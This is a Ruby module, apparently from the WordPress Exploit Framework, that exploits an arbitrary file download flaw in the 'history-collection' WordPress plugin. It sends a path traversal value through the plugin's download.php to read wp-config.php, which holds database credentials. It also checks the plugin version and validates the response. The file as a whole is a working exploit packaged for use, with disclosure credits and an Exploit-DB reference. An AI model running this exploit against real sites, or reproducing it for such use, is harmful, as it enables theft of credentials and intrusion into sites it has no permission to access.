# frozen_string_literal: true

class Wpxf::Auxiliary::HistoryCollectionArbitraryFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'History Collection Arbitrary File Download',
      author: [
        "Kuroi'SH", # Disclosure
        'rastating' # WPXF module
      ],
      references: [
        ['EDB', '37254']
      ],
      date: 'Jun 06 2015'
    )
  end

  def check
    check_plugin_version_from_readme('history-collection')
  end

  def default_remote_file_path
    '../../../wp-config.php'
  end

  def working_directory
    'wp-content/plugins/history-collection/'
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'history-collection', 'download.php')
  end

  def download_request_params
    { 'var' => remote_file }
  end

  def validate_content(content)
    if content.match?(/ERROR: File not found/i)
      emit_error 'The remote file could not be found'
      return false
    end

    super
  end
end
